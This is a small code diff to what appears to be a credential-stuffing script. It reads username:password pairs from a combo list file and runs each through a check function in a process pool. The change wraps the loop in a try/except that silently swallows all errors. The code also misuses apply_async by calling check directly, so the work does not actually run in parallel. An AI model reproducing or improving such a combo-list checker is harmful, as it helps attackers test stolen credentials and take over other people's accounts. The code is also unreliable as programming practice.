@@ -97,10 +97,13 @@ with open("combo.txt", "r") as f:
 
 
 for item in lines:
-    username,password = item.split(":")
-    password = password.strip()
-    username = username.strip()
-    pool.apply_async(check(username,password), (username,password))
+    try:
+        username,password = item.split(":")
+        password = password.strip()
+        username = username.strip()
+        pool.apply_async(check(username,password), (username,password))
+    except Exception as e:
+        1+1
 
 pool.close()
 pool.join()
